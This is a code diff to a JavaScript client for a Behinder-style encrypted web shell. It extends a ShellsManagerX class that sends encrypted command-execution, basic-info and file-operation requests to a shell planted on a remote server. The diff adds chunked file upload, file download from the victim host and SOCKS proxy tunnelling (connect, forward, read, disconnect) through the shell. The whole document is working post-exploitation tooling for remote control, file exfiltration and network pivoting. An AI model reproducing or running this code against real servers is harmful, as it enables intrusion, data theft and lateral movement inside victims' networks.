@@ -1,6 +1,3 @@
-const url = require("url");
-const urlParse = require("url");
-
 function activate(content) {
     let cookiejar = require('./behinder/jar');
     let utils = require("./behinder/utils");
@@ -9,6 +6,7 @@ function activate(content) {
 
     class ShellsManagerX {
         constructor() {
+            this.isDown = false;
             this.os = require('os');
             this.fs = require('fs');
             this.path = require('path');
@@ -49,7 +47,7 @@ function activate(content) {
                 console.log(fixjson);
                 let queue = this.getQueue();
                 queue.info['shells'] = fixjson;
-                fs.writeFile(this.filePath, JSON.stringify(queue, null, 6), (err, res) => {
+                this.fs.writeFile(this.filePath, JSON.stringify(queue, null, 6), (err, res) => {
                     if (err) {
                         reject(err);
                     } else {
@@ -73,13 +71,16 @@ function activate(content) {
             if (this.script === "jsp") {
                 params.set("forcePrint", force);
             }
-            console.log(this.encryptType)
             let data = this.GetData(this.pwd, "EchoGo", params, this.script, this.encryptType)
             return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
-                let resObj = Buffer.from(res, 'hex');
+                let resObj = Buffer.from(res.body, 'hex');
                 console.log(resObj)
                 return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
             })
+            // let res = this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0)
+            // let resObj = Buffer.from(res, 'hex');
+            // console.log(resObj)
+            // return this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
         }
 
 
@@ -91,7 +92,7 @@ function activate(content) {
             }
             let data = this.GetData(this.pwd, "BasicInfoGo", params, this.script, this.encryptType)
             return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
-                let resObj = Buffer.from(res, 'hex');
+                let resObj = Buffer.from(res.body, 'hex');
                 let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                 console.log(resMap)
                 let resJson = JSON.parse(resMap)
@@ -114,7 +115,7 @@ function activate(content) {
             }
             let data = this.GetData(this.pwd, "CmdGo", params, this.script, this.encryptType)
             return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
-                let resObj = Buffer.from(res, 'hex');
+                let resObj = Buffer.from(res.body, 'hex');
                 let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
                 let resJson = JSON.parse(resMap)
                 for (let k in resJson) {
@@ -129,16 +130,120 @@ function activate(content) {
             let operParams = this.fileSelectMode(mode, path, force, params)
             let data = this.GetData(this.pwd, "FileOperationGo", operParams, this.script, this.encryptType)
             return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
-                let resObj = Buffer.from(res, 'hex');
-                let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
-                let resJson = JSON.parse(resMap)
-                console.log(resJson)
-                for (let k in resJson) {
-                    resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
-                }
-                return resJson
-            })
+                let resObj = Buffer.from(res.body, 'hex');
+                let resMap
+                if (mode === "download") {
+                    try {
+                        utils.ExportRaw(params["remote_path"].split('/').slice(-1), resObj)
+                        return "success"
+                    } catch (e) {
+                        return e
+                    }
 
+                } else {
+                    resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
+                    let resJson = JSON.parse(resMap)
+                    for (let k in resJson) {
+                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
+                    }
+                    console.log(resJson)
+                    return resJson
+                }
+            })
+        }
+
+        uploadFile(remotePath, filePath, fileContent, force, useBlock, callback) {
+            callback && callback(0)
+            let params = new Map();
+            params.set("mode", "create");
+            params.set("path", remotePath);
+            if (this.script === "jsp") {
+                params.set("forcePrint", force);
+            }
+            if (!useBlock) {
+                if (filePath.length > 0) {
+                    fileContent = this.fs.readFileSync(filePath)
+                }
+                params.set("content", Buffer.from(fileContent).toString('base64'));
+                let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
+                return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                    let resObj = Buffer.from(res.body, 'hex');
+                    let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
+                    let resJson = JSON.parse(resMap)
+                    for (let k in resJson) {
+                        resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
+                    }
+                    console.log(resJson)
+                    return resJson
+                })
+            } else {
+                let blocks = utils.FileSplit(filePath, 46080)
+                const CustomForeach = async (arr, callback) => {
+                    const length = arr.length;
+                    const O = Object(arr);
+                    let k = 0;
+                    let data;
+                    while (k < length) {
+                        if (!this.isDown) {
+                            return null;
+                        }
+                        if (k in O) {
+                            console.log('doing foreach...');
+                            const kValue = O[k];
+                            data = await callback(kValue, k, O);
+                        }
+                        if (!this.isDown) {
+                            return null;
+                        }
+                        k++;
+                    }
+                    return data
+                };
+                return CustomForeach(blocks, (item, key, arr) => {
+                    return new Promise((resolve, reject) => {
+                        if (key === 0) {
+                            params.set("mode", "create");
+                        } else {
+                            params.set("mode", "append");
+                        }
+                        params.set("path", remotePath);
+                        params.set("content", Buffer.from(item).toString('base64'));
+                        let data = this.GetData(this.pwd, "FileOperationGo", params, this.script, this.encryptType)
+                        this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                            let resObj = Buffer.from(res.body, 'hex');
+                            let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
+                            let resJson = JSON.parse(resMap)
+                            for (let k in resJson) {
+                                resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
+                            }
+                            console.log(resJson)
+                            // return resJson
+                            if (resJson.status === "success") {
+                                if (key === blocks.length - 1) {
+                                    console.log('success')
+                                    console.log(resJson)
+                                    resolve(resJson)
+                                }
+                                if (callback) {
+                                    if (!this.isDown) {
+                                        callback(null)
+                                    } else {
+                                        callback(Math.floor(((key + 1) / arr.length) * 100))
+                                    }
+                                }
+                                resolve(resJson)
+                            } else {
+                                let err = new Error(resJson.msg)
+                                console.log(err)
+                                reject(err)
+                            }
+                        }).catch(e => {
+                            console.log(e)
+                            reject(e)
+                        })
+                    })
+                })
+            }
         }
 
         fileSelectMode(mode, path, force, operJson) {
@@ -152,7 +257,7 @@ function activate(content) {
             let modifyTimeStamp = operJson["modify_time_stamp"]
             let accessTimeStamp = operJson["access_time_stamp"]
             let isChunk = operJson["is_chunk"]
-            if (pathStr.charAt(pathStr.length - 1) !== "/") {
+            if (pathStr.charAt(pathStr.length - 1) !== "/" && mode !== "delete") {
                 pathStr = pathStr + "/"
             }
 
@@ -169,10 +274,10 @@ function activate(content) {
                 //	打开文件
                 case "show":
                     params.set("mode", mode)
-                    params.set("path", pathStr + oldFileName)
-                    // if s.script == "php" {
-                    //     params["content"] = ""
-                    // }
+                    params.set("path", pathStr + oldFileName);
+                    if (this.script === "php") {
+                        params.set("content", "");
+                    }
                     if (charSet !== "") {
                         params.set("charset", charSet)
                     }
@@ -238,6 +343,107 @@ function activate(content) {
                     break
             }
             return params
+        }
+
+        readProxyData(socketHash) {
+            let params = new Map();
+            params.set("cmd", "READ");
+            if (this.script === "php") {
+                params.set("remoteIP", "");
+                params.set("remotePort", "");
+            }
+            params.set("socketHash", socketHash);
+            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
+            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                // let resObj = Buffer.from(res.body, 'hex');
+                // let resMap = this.cryptox.decrypt(resObj, this.pwd, this.encryptType, this.script)
+                // let resJson = JSON.parse(resMap)
+                // for (let k in resJson) {
+                //     resJson[k] = Buffer.from(resJson[k], 'base64').toString('utf-8');
+                // }
+                // console.log(resJson)
+                // return resJson
+                let resData
+                if (res.statusCode === 200) {
+                    resData = Buffer.from(res.body, 'hex')
+                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
+                        resData = null;
+                    } else {
+                        let resDataB
+                        if (res.headers.server.length !== 0 && res.headers.server.indexOf("Apache-Coyote/1.1") > 0) {
+                            resDataB = resData.slice(0, resData.length - 1);
+                        }
+
+                        if (resDataB == null) {
+                            resData = null;
+                        }
+                    }
+                } else {
+                    resData = null
+                }
+                return resData
+            })
+
+        }
+
+        writeProxyData(proxyData, socketHash) {
+            let params = new Map();
+            params.set("cmd", "FORWARD");
+            params.set("targetIP", "");
+            params.set("targetPort", "");
+            params.set("socketHash", socketHash);
+            params.set("extraData", Buffer.from(proxyData).toString('base64'));
+            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
+            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                let resData
+                if (res.statusCode === 200) {
+                    resData = Buffer.from(res.body, 'hex')
+                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
+                        resData = resData.slice(4, resData.length)
+                        return false
+                    } else {
+                        return true
+                    }
+                } else {
+                    return false
+                }
+            })
+
+        }
+
+        closeProxy(socketHash){
+            let params = new Map();
+            params.set("cmd", "DISCONNECT");
+            params.set("socketHash", socketHash);
+            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
+            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                return res.statusCode === 200;
+            })
+
+        }
+        openProxy(destHost,destPort,socketHash){
+            let params = new Map();
+            params.set("cmd", "CONNECT");
+            params.set("targetIP", destHost);
+            params.set("targetPort", destPort);
+            params.set("socketHash", socketHash);
+            let data = this.GetData(this.pwd, "SocksProxyGo", params, this.script, this.encryptType)
+            let resData
+            return this.http.RequestAndParse(this.url, jar, this.proxy, this.headers, data, 0, 0).then(res => {
+                resData = Buffer.from(res.body, 'hex')
+                if (res.statusCode === 200) {
+                    resData = Buffer.from(res.body, 'hex')
+                    if (resData != null && resData.length >= 4 && resData[0] === 55 && resData[1] === 33 && resData[2] === 73 && resData[3] === 54) {
+                        resData = resData.slice(4, resData.length)
+                        return false
+                    } else {
+                        return true
+                    }
+                } else {
+                    return false
+                }
+            })
+
         }
     }
 
